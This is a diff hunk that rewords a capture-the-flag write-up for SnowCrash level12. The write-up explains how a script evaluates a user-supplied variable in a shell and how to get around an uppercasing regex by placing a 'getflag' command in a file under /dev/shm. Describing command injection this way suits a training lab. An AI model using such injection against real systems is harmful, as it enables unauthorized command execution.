@@ -49,9 +49,9 @@ Here's what that would look like in a navigator:<br/>
 
 In the program, the shellscript is evaluated in the $xx variable... which we can exploit!<br/>
 The regex will capitalize the $xx argument. <br/>
-If we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
+So if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
 Linux is case-sensitive, so it will fail to recognize a filepath in capital case. <br/>
-Let's try writing our script to a file. 
+Hmm... let's try writing our script to a file instead. 
 ```
 level12@SnowCrash:~$ echo "getflag > /dev/shm/flag12" > /dev/shm/EXPLOIT
 level12@SnowCrash:~$ cat /dev/shm/EXPLOIT
